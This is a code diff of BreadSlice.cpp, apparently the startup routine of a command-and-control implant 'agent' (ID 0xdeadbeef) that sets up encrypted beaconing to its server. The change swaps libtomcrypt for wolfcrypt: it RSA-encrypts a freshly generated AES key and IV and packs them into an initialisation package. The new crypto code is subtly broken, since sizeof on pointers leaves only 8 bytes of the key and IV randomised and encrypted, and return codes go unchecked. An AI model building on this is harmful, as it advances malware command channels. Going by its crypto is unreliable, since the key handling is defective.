@@ -1,56 +1,67 @@
 // BreadSlice.cpp : This file contains the 'main' function. Program execution begins and ends there.
 
+#include <wolfcrypt/rsa.h>
+#include <wolfcrypt/random.h>
 #include "package.h"
 #include "agent.h"
 #include "Helpers.h"
 #include "enum.h"
 #include "Http.h"
 #include "localcstd.h"
-#include <wolfcrypt/rsa.h>
+
 
 int main()
 
 //TODO finish establishing secure comms.
 {
+    //read rsa public key in der format from file.
+    unsigned char* RsaPublicKeyDerBytes;
+    unsigned long RsaPublicKeySize;
+
+    ReadRsaPublicKey(&RsaPublicKeyDerBytes, &RsaPublicKeySize);
+    RsaKey rsaPublicKey;
+    word32 idx = 0;
+    wc_InitRsaKey(&rsaPublicKey, NULL);
+    wc_RsaPublicKeyDecode(RsaPublicKeyDerBytes, &idx, &rsaPublicKey, RsaPublicKeySize);
+
+    //generate rng object
+    WC_RNG rng;
+    wc_InitRng(&rng);
+
+    //generate aeskey and iv
+    byte* EncryptedAesKey = (byte*)malloc(sizeof(byte) * 150);
+    byte* EncryptedIV = (byte*)malloc(sizeof(byte) * 150);
+    byte* AesKey = (byte*)malloc(sizeof(byte) * AES_256_KEY_SIZE);
+    byte* AesIV = (byte*)malloc(sizeof(byte) * AES_BLOCK_SIZE);
+    MemorySet(EncryptedAesKey, 0, 150);
+    MemorySet(EncryptedIV, 0, 150);
+    MemorySet(AesKey, 0, AES_256_KEY_SIZE);
+    MemorySet(AesIV, 0, AES_BLOCK_SIZE);
+
+    wc_RNG_GenerateBlock(&rng, AesKey, sizeof(AesKey));
+    wc_RNG_GenerateBlock(&rng, AesIV, sizeof(AesIV));
+
+    //encrypt aes key
+    word32 EncryptedKeySize = wc_RsaPublicEncrypt(AesKey, sizeof(AesKey), EncryptedAesKey, 150, &rsaPublicKey, &rng);
+    word32 EncryptedIvSize = wc_RsaPublicEncrypt(AesIV, AES_BLOCK_SIZE, EncryptedIV, 150, &rsaPublicKey, &rng);
+    wc_FreeRng(&rng);
+
+   //encrypt iv
 
     pPackage pPack;
     Agent AgentData = { 0 };
     INT err;
 
     AgentData.AgentID = 0xdeadbeef;
-    
-    ltc_mp = ltm_desc;
-    register_all_ciphers();
-    register_all_hashes();
-    register_all_prngs();
+    AgentData.AESKey = AesKey;
+    AgentData.AESKeySize = AES_256_KEY_SIZE;
+    AgentData.EncryptedAESKey = EncryptedAesKey;
+    AgentData.EncryptedAESKeySize = EncryptedKeySize;
+    AgentData.IV = AesIV;
+    AgentData.IVSize = AES_BLOCK_SIZE;
+    AgentData.EncryptedIV = EncryptedIV;
+    AgentData.EncryptedIVSize = EncryptedIvSize;
 
-    unsigned char* PublicKey;
-    unsigned long PublicKeySize;
-    unsigned long SymmetricKeySize = 32;
-
-    prng_state* prng = CreatePRNGState();
-    char* SymmetricKey = CreateAESKey(prng);
-    char* IV = CreateIV(prng);
-
-    AgentData.AESKey = SymmetricKey;
-    AgentData.AESKeySize = 32;
-
-    AgentData.IV = IV;
-    AgentData.IVSize = 16;
-
-    sprng_done(prng);
-    free(prng);
-
-
-    if (ReadPublicKey(&PublicKey, &PublicKeySize) != 0) {
-        printf("[error] attempting to read public key\n");
-        return -1;
-    }
-
-    EncryptAESKey(AgentData.AESKey, AgentData.AESKeySize, PublicKey, PublicKeySize, &AgentData.EncryptedAESKey, &AgentData.EncryptedAESKeySize);
-    EncryptAESKey(AgentData.IV, AgentData.IVSize, PublicKey, PublicKeySize, &AgentData.EncryptedIV, &AgentData.EncryptedIVSize);
-
-    free(PublicKey);
     
     if ((pPack = CreatePackageWithMetaData(INITIALIZE_AGENT, &AgentData)) == NULL) {
         printf("[error] attempting to create package\n");
@@ -89,6 +100,5 @@ int main()
 
 
     PackageSendMetaDataPackage(AgentData.packages, NULL, NULL, &AgentData);
-     
 }
 
